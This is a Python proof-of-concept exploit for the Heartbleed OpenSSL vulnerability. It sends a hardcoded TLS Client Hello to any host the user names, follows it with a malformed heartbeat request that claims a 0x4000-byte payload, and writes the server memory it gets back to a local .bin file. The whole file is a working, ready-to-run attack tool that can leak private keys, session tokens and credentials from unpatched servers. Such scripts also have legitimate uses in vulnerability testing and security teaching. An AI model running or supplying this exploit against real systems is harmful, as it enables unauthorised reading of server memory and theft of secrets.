import argparse
import time
import re
import select
import socket
import struct
import ssl
import sys


def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf:
            return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def hit_hb(s, output_file):
    s.send(hb)

    response_data = b''

    while True:
        hdr = s.recv(5)
        if hdr is None:
            print('Unexpected EOF receiving record header - server closed connection')
            return False        
        try:
            (content_type, version, length) = struct.unpack('>BHH', hdr)
        except Exception as e:
            print(f"Error: {e}. Server may not be vulnerable")
            return

        if content_type is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        pay = recvall(s, length)
        if pay is None:
            print('Unexpected EOF receiving record payload - server closed connection')
            return False

        sys.stdout.write(' ... received message: type = %d, ver = %04x, length = %d' % (content_type, version, len(pay)))
        print('')

        response_data += pay

        if content_type == 24:
            print('Received heartbeat response, saving to file...')
            with open(output_file, 'wb') as file:
                file.write(response_data)
            print('File saved as', output_file)
            return True

        if content_type == 21:
            print('Received alert:')
            #hexdump(pay)
            print('Server returned error, likely not vulnerable')
            return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Heartbleed PoC')
    parser.add_argument('-s', '--host', required=True, help='hostname or IP address')
    parser.add_argument('-p', '--port', type=int, default=443, help='TCP port number')
    parser.add_argument('-f', '--output_file', default='', help='output file name')
    args = parser.parse_args()

    if not args.output_file:
        timestamp = int(time.time())
        args.output_file = f'{args.host}_{timestamp}.bin'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting...')
    s.connect((args.host, args.port))

    print('Sending Client Hello...')
    s.send(hello)
    while True:
        hdr = s.recv(5)
        (content_type, version, length) = struct.unpack('>BHH', hdr)
        hand = recvall(s, length)
        try:
            print(' ... received message: type = %d, ver = %04x, length = %d' % (content_type, version, len(hand)))
        except Exception as e:
            print(f"Error: {e}. Server may not be vulnerable")
            break
        if content_type == 22 and hand[0] == 0x0E:
            break

    print('Handshake done...')
    print('Sending heartbeat request with length 4:')
    hit_hb(s, args.output_file)